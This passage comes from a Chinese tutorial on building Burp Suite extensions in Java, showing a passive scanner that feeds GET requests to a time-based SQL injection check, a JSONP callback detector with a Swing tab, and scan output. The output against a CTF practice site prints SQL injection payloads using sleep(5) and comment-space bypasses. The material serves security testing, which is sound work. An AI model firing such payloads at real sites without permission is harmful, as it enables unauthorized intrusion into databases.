			checkUNKNOWNGet(baseRequestResponse, helpers, stdout);
			break;
		default:
			break;
		}
	}

	/* 根据get内容的类型来分工 */
	/* AMF类型 */
	private static void checkAMFGet() {

	}

	/* JSON类型 */
	private static void checkJSONGet() {

	}

	/* MULTIPART类型 */
	private static void checkMULTIPARTGet() {

	}

	/* NONE类型 */
	private static void checkNONEGet() {

	}

	/* UNKNOWN类型 */
	private static void checkUNKNOWNGet(
			IHttpRequestResponse baseRequestResponse,
			IExtensionHelpers helpers, PrintWriter stdout) {
		SQLINJECT.checkGetSqlinject(baseRequestResponse, helpers, stdout);
	}

	/* URL_ENCODED类型 */
	private static void checkURLENCODEDGet(
			IHttpRequestResponse baseRequestResponse,
			IExtensionHelpers helpers, PrintWriter stdout) {
		SQLINJECT.checkGetSqlinject(baseRequestResponse, helpers, stdout);
	}

	/* XML类型 */
	private static void checkXMLGet() {

	}

}
```

+ IExtensionHelpers接口

![IExtensionHelpers接口](http://upload-images.jianshu.io/upload_images/1348446-07e2685c21053b0c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

+ IHttpRequestResponse接口

![IHttpRequestResponse接口](http://upload-images.jianshu.io/upload_images/1348446-7f1d91cf17953dcb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

+ IParameter接口

![IParameter接口](http://upload-images.jianshu.io/upload_images/1348446-35068ae2c0f1b819.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

+ IRequestInfo接口

![IRequestInfo接口](http://upload-images.jianshu.io/upload_images/1348446-7c19a4240c78721d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

+ BurpExtend.java

```java
package burp;

import java.io.PrintStream;
import java.io.PrintWriter;
import java.net.URL;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Collections;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Iterator;
import java.util.List;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.apache.http.entity.ContentType;

import bsmali4.FuzzVul;

public class BurpExtender implements IBurpExtender, IScannerCheck {
	public IBurpExtenderCallbacks callbacks;
	public IExtensionHelpers helpers;
	public PrintWriter stdout;

	public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) {
		this.callbacks = callbacks;
		stdout = new PrintWriter(callbacks.getStdout(), true);
		this.helpers = callbacks.getHelpers();

		callbacks.setExtensionName("Time-based sqlinject checks");

		callbacks.registerScannerCheck(this);

		System.out.println("Loaded Time-based sqlinject checks");
	}

	@Override
	public int consolidateDuplicateIssues(IScanIssue existingIssue,
			IScanIssue newIssue) {
		// TODO Auto-generated method stub
		return 0;
	}

	// 主动式扫描
	@Override
	public List<IScanIssue> doActiveScan(
			IHttpRequestResponse baseRequestResponse,
			IScannerInsertionPoint insertionPoint) {
		// TODO Auto-generated method stub
		return null;
	}

	// 被动式扫描
	@Override
	public List<IScanIssue> doPassiveScan(
			IHttpRequestResponse baseRequestResponse) {

		String method = this.helpers.analyzeRequest(baseRequestResponse)
				.getMethod();
		String url = this.helpers.analyzeRequest(baseRequestResponse).getUrl()
				.toString();
		if (!url.contains("google.com")) {
			if (method != null && method.trim().equals("POST")) {
				FuzzVul.checkPost(baseRequestResponse, helpers, stdout);
			} else if (method.trim().equals("GET")) {
				FuzzVul.checkGet(baseRequestResponse, helpers, stdout);
			}
		}
		return null;
	}

}
```
+ IBurpExtender接口

![ IBurpExtender接口
](http://upload-images.jianshu.io/upload_images/1348446-fb464e988e4e479a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

![IBurpExtenderCallbacks](http://upload-images.jianshu.io/upload_images/1348446-7b6374791928f04f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

+ IScannerCheck接口

![IScannerCheck](http://upload-images.jianshu.io/upload_images/1348446-60ee4b7eda1a608a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)


** 上面是没有编写界面的情况，下面是编写界面的方法 **
编写的界面的效果如图：

![界面效果](http://upload-images.jianshu.io/upload_images/1348446-dbc554d05786dd67.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
编写界面的代码如下：

```java
/*
 *  BurpSuite 插件开发指南之 Java 篇
 *  writend by Her0in 
 */
package burp;

import java.awt.BorderLayout;
import java.awt.Component;
import java.awt.Rectangle;
import java.awt.event.ComponentEvent;
import java.awt.event.ComponentListener;
import java.io.PrintWriter;
import java.util.Vector;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTabbedPane;
import javax.swing.ScrollPaneConstants;
import javax.swing.SwingUtilities;

public class BurpExtender implements IBurpExtender, ITab, IHttpListener{

    public PrintWriter stdout;
    public IExtensionHelpers hps;
    public IBurpExtenderCallbacks cbs;

    public IRequestInfo iRequestInfo;
    public IResponseInfo iResponseInfo;

    public JPanel jPanel_top;
    public JTabbedPane jTabbedPane; 
    public JScrollPane jScrollPane;
    public JSplitPane jSplitPaneV;

    // 自己封装一个 Table 控件
    private Her0inTable jsonTable;

    //请求，响应信息显示
    public JPanel jPanel_reqInfo_left;
    public JPanel jPanel_respInfo_right;
    public JSplitPane jSplitPaneInfo;
    public ITextEditor iRequestTextEditor;
    public ITextEditor iResponseTextEditor;

    Boolean bFind = false;
    String strTags = "";

    @Override
    public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) {

        callbacks.setExtensionName("JSON 水坑检测"); //设置扩展名称

        this.hps = callbacks.getHelpers();
        this.cbs = callbacks;
        this.stdout = new PrintWriter(callbacks.getStdout(), true);

        this.stdout.println("hello burp!");

        SwingUtilities.invokeLater(new Runnable() {
            @Override
            public void run() {

                // 初始化垂直分隔面板
                jSplitPaneV = new JSplitPane(JSplitPane.VERTICAL_SPLIT, true);
                jSplitPaneV.setDividerLocation(0.5);
                jSplitPaneV.setOneTouchExpandable(true);

                // 垂直分隔面板的顶部
                jPanel_top = new JPanel();
                // 设置垂直分隔面板顶部的子控件
                // 放置表格控件
                jTabbedPane = new JTabbedPane();

                // 初始化 Burp 提供的 ITextEditor 编辑器接口
                iRequestTextEditor = cbs.createTextEditor();
                iRequestTextEditor.setEditable(false);

                iResponseTextEditor = cbs.createTextEditor();
                iResponseTextEditor.setEditable(false);

                // 初始化 jsonTable
                jsonTable = new Her0inTable(iRequestTextEditor, iResponseTextEditor, stdout);

                // 最好放置一个 JScrollPane
                JScrollPane jScrollPane1 = new JScrollPane(jsonTable.getTab());
                jScrollPane1.setHorizontalScrollBarPolicy(ScrollPaneConstants.HORIZONTAL_SCROLLBAR_AS_NEEDED);
                jScrollPane1.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_AS_NEEDED);

                jTabbedPane.scrollRectToVisible(new Rectangle(500, 70));
                jTabbedPane.addTab("JSON 水坑检测", jScrollPane1);

                jScrollPane = new JScrollPane(jTabbedPane);
                jScrollPane.setHorizontalScrollBarPolicy(ScrollPaneConstants.HORIZONTAL_SCROLLBAR_AS_NEEDED);
                jScrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_AS_NEEDED);
                jPanel_top.add(jScrollPane, BorderLayout.CENTER);
                jPanel_top.setLayout(null);

                // 添加componentResized事件 否则在改变Burp 主窗口大小时会错位
                jPanel_top.addComponentListener(new ComponentListener() {

                    @Override
                    public void componentShown(ComponentEvent e) {
                    }

                    @Override
                    public void componentResized(ComponentEvent e) {
                            if(e.getSource() == jPanel_top){
                                    jScrollPane.setSize(jPanel_top.getSize().width - 5,
                                                    jPanel_top.getSize().height - 5);                           
                                    jScrollPane.setSize(jPanel_top.getSize().width - 10,
                                                    jPanel_top.getSize().height - 10);
                            }
                    }

                    @Override
                    public void componentMoved(ComponentEvent e) {
                            // TODO Auto-generated method stub
                    }

                    @Override
                    public void componentHidden(ComponentEvent e) {
                            // TODO Auto-generated method stub  
                    }
                });

                // 设置垂直分隔面板底部的子控件

                // 显示请求/响应 信息的水平分隔面板初始化
                jSplitPaneInfo = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT, true);
                jSplitPaneInfo.setDividerLocation(0.5);
                jSplitPaneInfo.setOneTouchExpandable(true); 

                // 初始化 请求，响应信息显示 面板                             
                jPanel_reqInfo_left = new JPanel();
                jPanel_respInfo_right = new JPanel();

                jPanel_reqInfo_left.setLayout(new BorderLayout());
                jPanel_respInfo_right.setLayout(new BorderLayout());

                // 将 Burp 提供的 ITextEditor 编辑器 添加到请求，响应信息显示 面板中
                jPanel_reqInfo_left.add(iRequestTextEditor.getComponent(),
                                BorderLayout.CENTER);
                jPanel_respInfo_right.add(iResponseTextEditor.getComponent(),
                                BorderLayout.CENTER);

                // 分别添加 请求，响应信息显示 面板 到 垂直分隔面板底部
                jSplitPaneInfo.add(jPanel_reqInfo_left, JSplitPane.LEFT);
                jSplitPaneInfo.add(jPanel_respInfo_right, JSplitPane.RIGHT);

                // 最后,为垂直分隔面板添加顶部面板和水平分隔面板
                jSplitPaneV.add(jPanel_top, JSplitPane.TOP);
                jSplitPaneV.add(jSplitPaneInfo, JSplitPane.BOTTOM);

                // 设置自定义组件并添加标签
                cbs.customizeUiComponent(jSplitPaneV);
                cbs.addSuiteTab(BurpExtender.this);
            }
        });

        callbacks.registerHttpListener(this);
    }

    // 实现 ITab 接口的 getTabCaption 方法
    @Override
    public String getTabCaption() {
        return "JSON 水坑检测";
    }

    // 实现 ITab 接口的 getUiComponent 方法
    @Override
    public Component getUiComponent() {
        return jSplitPaneV;
    }


    public void CheckJson(IHttpRequestResponse messageInfo) {
            try {
                this.iRequestInfo = this.hps.analyzeRequest(messageInfo);
                this.iResponseInfo = this.hps.analyzeResponse(messageInfo.getResponse());   
            } catch (Exception e) {
                return ;
            }

//            stdout.println(messageInfo.getHttpService().getHost());

            this.bFind = false;
            java.util.List<IParameter> listIParameters = iRequestInfo.getParameters();  
            strTags = "";
            for (IParameter param : listIParameters) {
                    String strName = param.getName().toLowerCase();
                    if(strName.indexOf("callback") != -1 || strName.indexOf("_callback") !=-1 ||
                                    strName.indexOf("cb") !=-1 || strName.indexOf("_cb") != -1 ||
                                    strName.indexOf("huidiao") !=-1 ){
                            strTags += "# find => " + strName;
                            this.bFind = true;
                    }
            }


            if(this.bFind){
                    Vector<String> vectorRow = new Vector<String>();
                    vectorRow.addElement(new String(Integer.toString(jsonTable.defaultTableModel.getRowCount())));
                    vectorRow.addElement(new String(this.iRequestInfo.getUrl().getHost()));
                    vectorRow.addElement(new String(this.iRequestInfo.getMethod()));
                    if(this.iRequestInfo.getUrl().getQuery() != null){
                            vectorRow.addElement(new String(this.iRequestInfo.getUrl().getPath() + "?" + this.iRequestInfo.getUrl().getQuery()));
                    }else{
                            vectorRow.addElement(new String(this.iRequestInfo.getUrl().getPath()));
                    }
                    vectorRow.addElement(new String(strTags));
                    jsonTable.defaultTableModel.addRow(vectorRow);
                    jsonTable.iHttpList.add(messageInfo);
            }
    }

    @Override
    public void processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo) {

        if (!messageIsRequest) {
            //JSON 检测
            this.CheckJson(messageInfo);
        }
    }
}
```

这个类是通过继承IBurpExtender, ITab, IHttpListener这三个接口来实现的。

+ ITab接口

![ITab接口](http://upload-images.jianshu.io/upload_images/1348446-2264bb0eda5d26f8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

```java
package burp;

import java.awt.Component;
import java.io.PrintWriter;

import javax.swing.JButton;
import javax.swing.JPanel;
import javax.swing.SwingUtilities;

public class BurpExtender implements IBurpExtender, ITab{

    public PrintWriter stdout;
    public IExtensionHelpers helpers;

    private JPanel jPanel1;
    private JButton jButton1;

    @Override
    public void registerExtenderCallbacks(final IBurpExtenderCallbacks callbacks){

        this.stdout = new PrintWriter(callbacks.getStdout(), true);
        this.helpers = callbacks.getHelpers();
        callbacks.setExtensionName("Her0in");
        SwingUtilities.invokeLater(new Runnable() {
            @Override
            public void run() {
                 //创建一个 JPanel
                 jPanel1 = new JPanel();
                 jButton1 = new JButton("点我");

                 // 将按钮添加到面板中
                 jPanel1.add(jButton1);

                 //自定义的 UI 组件
                 callbacks.customizeUiComponent(jPanel1);
                 //将自定义的标签页添加到Burp UI 中
                 callbacks.addSuiteTab(BurpExtender.this);
            }
       });
    }

    @Override
    public String getTabCaption() {
        // 返回自定义标签页的标题
        return "Her0in";
    }

    @Override
    public Component getUiComponent() {
        // 返回自定义标签页中的面板的组件对象
        return jPanel1;
    }
}
```
+  IHttpListener接口

![IHttpListener接口](http://upload-images.jianshu.io/upload_images/1348446-d1ce65f69a0251d5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

#### 导入插件 ####
![将编译出来的jar文件导入burpsuite中](http://upload-images.jianshu.io/upload_images/1348446-d0d89fcc62bdd332.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

![导出的结果](http://upload-images.jianshu.io/upload_images/1348446-2eb1e2fce95937fa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

#### 使用插件 ####

![打开一个存在简单的sql注入的网页](http://upload-images.jianshu.io/upload_images/1348446-6e3f69ec0affbb83.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

![burpsuite拦截请求](http://upload-images.jianshu.io/upload_images/1348446-f37aea3e107e0ab6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
点击Forword按钮后，切换到插件页面，选中sqlcheck插件，等一段时间后，可以看到输出的sql注入的结果。

![sql注入检测的结果](http://upload-images.jianshu.io/upload_images/1348446-c7a455b04f882eea.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

```
coded by bsmali4
===========================================
=========this**found**a**sqlinject=========
GET /423/web/?id=1 HTTP/1.1
Host: ctf5.shiyanbar.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://ctf5.shiyanbar.com/423/web/
Connection: close
Upgrade-Insecure-Requests: 1
?id=1'admin'/**/or/**/sleep(5)/**/or/**/'x'='x';
===========================================

===========================================
=========this**found**a**sqlinject=========
GET /423/web/?id=1 HTTP/1.1
Host: ctf5.shiyanbar.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://ctf5.shiyanbar.com/423/web/
Connection: close
Upgrade-Insecure-Requests: 1
?id=1/**/and/**/sleep(5)/**/or/**/'1'='1'--
===========================================
```
